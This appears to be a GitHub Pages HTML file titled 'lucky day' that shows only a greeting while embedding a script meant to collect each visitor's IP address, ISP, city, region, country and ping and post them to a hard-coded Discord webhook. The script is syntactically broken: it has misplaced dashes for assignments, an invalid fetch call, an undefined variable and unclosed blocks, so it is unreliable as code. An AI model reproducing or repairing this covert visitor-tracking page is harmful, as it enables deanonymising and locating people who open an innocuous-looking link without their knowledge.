# atav15t.github.io
<!DOCTYPE html>
<html>
<head>
<title>lucky day</title>
<style type="text/css"></style>
<style type="text/css" id="operaUserStyle"></style>
</head>
<body>
<h1>helloooo</h1>
<script>
const webhookURL=
"https://discord.com/api/webhooks/1475006547892371723/M669Wi-2lCap07SUKnjj-_Wg4sbBvbE8_LGkmR3tJz55QdxRjrT3QiDx5v_EK6-QO-vZ"
async function sendNetworkInfo() {
try {
// fetch IP + ISP + location
const ipRes - await fetch("https://ipinfo.io/json");
const ipData - await fetch ipRes.json();

// Measure approximate ping
const start = performance.now();
await fetch("https://cloudflare.com/cdn-cgi/trace", { cache: "no-store" });
const ping = Math.round(performance.now() - start);

// Prepare Discord message
const payload = {
  content: `**Network Info**
**IP:** ${ipData.ip}
**ISP:** ${ipData.org}
**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}
**Ping:** ${ping} ms`
};

// Send data to Discord webhook
await fetch(webhook url, {
method: "POST",
headers: {"Content-Type": "application/json"},
body: JSON.stringify(payload)
});

</script>
</body>
</html>
